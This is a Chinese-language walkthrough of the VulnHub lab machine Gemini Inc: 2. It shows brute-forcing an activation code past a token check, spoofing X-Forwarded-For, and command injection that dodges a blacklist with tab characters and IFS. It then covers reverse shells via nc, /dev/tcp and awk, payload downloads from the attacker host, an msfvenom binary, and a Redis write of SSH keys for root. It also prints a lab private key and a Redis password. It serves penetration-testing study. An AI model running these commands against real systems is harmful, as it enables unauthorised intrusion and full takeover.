靶机地址：[Gemini Inc: 2 ~ VulnHub](https://www.vulnhub.com/entry/gemini-inc-2,234/)

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- "192.168.1.49"
sudo nmap -p "22,80" -sV "192.168.1.49"
# 22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.25 ((Debian))
```
和之前的差不多，但是弱口令登录不上了
路径扫描
```Shell
sudo dirsearch -u "http://192.168.1.49"
# 没啥有用的 进一步探测
dirb "http://192.168.1.49" -r -X .php
# /activate.php
# /registration.php
```
通过 `/registration.php` 可以注册账号，但是登录成功后提示未激活，请提交6位激活码。
访问 `/activate.php` 是一个表单，字段为用户ID和激活码，很自然地想到暴力破解。
拦截请求，发现还有一个 `token` 字段，需要绕过
暴破类型选择Pitchfork: 多个参数各自指定字典，同时进行，不交叉
设置两个Payload点，分别在激活码和token的值上
激活码Payload类型选择 `Numbers` From 0 To 999999 Step 1，位数依次设置为 6 6 0 0
token类型选择 `Recursive grep` 递归搜索，`Options` 子选项卡中的 `Grep - Extract` 中设置匹配格式
因为要绕过token不能多线程，`Resource pool` 选项卡中增加一个最大请求数为1的，选中
还要在 `Options` 子选项卡中的 `Error Handling` 中禁止失败重试，设置为0就好了
很快，在 `000511` 的时候，响应长度变了，应该是激活成功了，再次登录看看，功能可以使用了。
可以看到全部用户和各个用户的详情页，在第一个用户的详情页源码中发现了如下注释
```html
<!-- <b>Password:</b> edbd1887e772e13c251f688a5f10c1ffbb67960d<br/> -->
```
Google一下这段密文，对应值为
```
secretpassword
```
尝试登录 `Gemini` ，成功了，发现比普通用户多了 `Admin Panel` ，但是都403了，响应中提示`IP NOT ALLOWED` ，尝试绕过，可以使用插件，发现增加如下标头可以绕过
```
X-Forwarded-For: 127.0.0.1
```
通过BurpSuite的 `Bypass WAF` 插件自动为请求添加头部
`Project options` 标签页下的 `Sessions` 子选项卡中的 `Sessions Handling Rules` 点击 `Add`
选择 `Invoke a Burp extension` ，`Scope` 全选，选择 `Use suite scope`
`Target` 中右键靶机IP 加入scope，`Re-enable`
设置完再访问，果然自动加了
也可以直接在 `Match and Replace` 中自己手动加
可以执行命令，尝试反弹Shell
```Shell
nc 192.168.1.26 4444 -e /bin/bash
```
提示执行失败，经过尝试，可能是空格被黑名单了，换成制表符可以绕过检测
```
nc%09192.168.1.26%094444
```
可以设置自动替换 `Proxy -> Options -> Match and Replace` ，`Add`
成功执行了，但没有收到连接，可能是目标系统没有netcat
尝试上传一个
```Shell
cd /usr/bin
python3 -m http.server 7331
```
下载
```Shell
wget http://192.168.1.26:7331/nc -O /tmp/nc
```
接下来
```Shell
chmod +x /tmp/nc
```
反弹shell
```Shell
/tmp/nc 192.168.1.26 4444 -e /bin/bash
```
失败了，再试试别的
```Shell
bash -i >& /dev/tcp/192.168.1.26/4444 0>&1
awk 'BEGIN{s="/inet/tcp/0/192.168.1.26/4444";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
```
这些方法都不行，太蠢了
可以使用IFS指定分隔符绕过黑名单，直接尝试上传WebShell
```Shell
IFS=",";a="wget,http://192.168.1.26:7331/rs.php,-O,/tmp/rs.php";$a
IFS=",";a="php,/tmp/rs.php";$a
```
还可以通过mfs生成反弹shell的二进制文件
```Shell
msfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=192.168.1.26 LPORT=4444 -b '\x00' -e 'x86/shikata_ga_nai' -f elf -o shell.bin
```
获取执行
```Shell
IFS=",";a="wget,http://192.168.1.26:7331/shell.bin,-O,/tmp/shell";$a
IFS=",";a="chmod,777,/tmp/shell";$a
/tmp/shell
```
成功获取到Shell，尝试提权
Redis提权
```Shell
ss -antlp
# 127.0.0.1:6379 redis
grep "requirepass" /etc/redis/6379.conf
# requirepass 8a7b86a2cd89d96dfcc125ebcc0535e6
redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6
> keys *
# 1) "crackit"
> get "crackit"
```
获取到如下内容
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA+GUWfhmRYKhf2C1Hd71wCpKDXvp63B53RMmpN/wtqMi/IuTX
+oAm/vfM5lbZShoKcYGT3AnYKOQGmJY96IlAR6rr4yWKVs2vnOMsJvKgpGxpQ4XD
Lc9wu0E0M3AXSPgTOEusoW/Ql1yUKJYUBJJLdCMQ2Kp1KSjnNqRMI377QNLKF2dW
maFzA+3hUoTVdZItrBw94AAKBs0rW4JMlROwlhCAWSMOUXeDe+Z/akwg21/lRf7x
fmzEHHGM/kQHqtvJqoPBnL51L3r5708X7f7UmXa6ancWj+RQXRwZlHEkGY3ZnFWg
WuoxJ6yafMA45Qw1pEIeff607BwOe76mQGReRQIDAQABAoIBAQC81iT+YrOp1vde
YjXl6welkfL7ntMOSr8DdYgG/tk7arocbftf/lMnHP4R0s7ITfnIhukArB9AHvKA
yB9yi/1pPqCsA9si2KX8UJw9U9EajyyLX8KdLgoW4aAsxrd9CtOZxbYM2POsTn54
SHgZbZqdRRdGkHgXfXghi1Ay4BNlGBuKtO6N52AV7rcumGXhvKDQRWno4rs4/KJh
7T4wX/e5Msny0FeTs3IvoVcZ98jT3QZNNtXMbnJNlj7GlZtPiOx1gKG5IRFSN6Xe
2ptdvffgr9KyeTUo/9tMwf+N68BXBlXBMbE5KgSOZIltPojaFou/6O7OmoSvlj3X
3R7wFp0VAoGBAP5fX5jylGBhNkCZy24rErZhy2HtzNoW9+2VLhU3AF3Qh09+mWgl
0sWwwuYRl4CADljOmFjVXt6QCOAfggDeQCmToJTsZtctLSHjEGJWR1JD+uOEMS7o
2hSwy2at6CTv+SJ+R3DprUGMHdJoK30NGzomLMGMYv56tjzliVQvJQunAoGBAPn7
7IB/qCyaOZJw4lzYKQnvSqqt+hdU3a0jD06zs92UNjf2OdSZVA1FSAkIo0P3/4RD
vu/pHF9QJ9mapjV9P1P9mhZ6SNEh7LYOXqWu2jWSNqrMAdNljb0GG9NEMpdzAI6H
M3XzBbZPQVGz6Urd8NGdKn4k3Xrham+LXz0rVhQzAoGBAMk4owP3qT5QyDz0LEPb
GPNjiyLNnYZMMxYjM5AesVCFO/S7nhkQCprOCG89LU6+fhrsWwGy0FhZMlwxMIMF
TVZWbOpB09yV5STwXS6dN9Aw7I/8K3gDRTim3lA8c+58UuVhZZxBjgfTEmg2dWh3
7LjkJ/V323uZkP29ShRpMvHzAoGAGc7mdcW4KRKrCvFYjVlLs1jfDovzm+EJGcza
0bc/xIp+pnxnMAm8YbpbW4Nmx6ec25za443fff+afZ63tiH+Hb+63sM1LVIhTBJj
txs8L/euaSeysI51eaRdzwvlZTlcP1q5911lo5K/HZ5DYZVUPW/KaUeJDhyjjmyH
IpuMwX0CgYEAluSwBfv2orBet+Q4eF+rxwVOG6QKbl4ozcVcd8KUfCxqe2Q9u2hN
r708EeAVLNolvalHALOfPVnOuvpfBs7q7GMwQi5WNEJBjY4kusi/6ZDZPwcrYk25
5sNTyVYoqjI/3qe2naHLzM7ftato0QtKg10i8XkAEOzWyFVRsP2RZak=
-----END RSA PRIVATE KEY-----
```
传一个公钥上去
```Shell
mkdir .ssh
wget http://192.168.1.26:7331/id_rsa.pub -O .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
chmod 755 .ssh/
```
这样的话就可以直接ssh到靶机上了
```Shell
cp .ssh/authorized_keys id_rsa.pub
# 准备数据
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > public.txt
# 先清空全部数据
redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 flushall
cat public.txt | redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6 -x set 1
```
再将它通过root权限写入root的对应目录下即可
```Shell
redis-cli -a 8a7b86a2cd89d96dfcc125ebcc0535e6
> CONFIG SET dir /root/.ssh
> CONFIG SET dbfilename authorized_keys
> save
> exit
```
成功获取root权限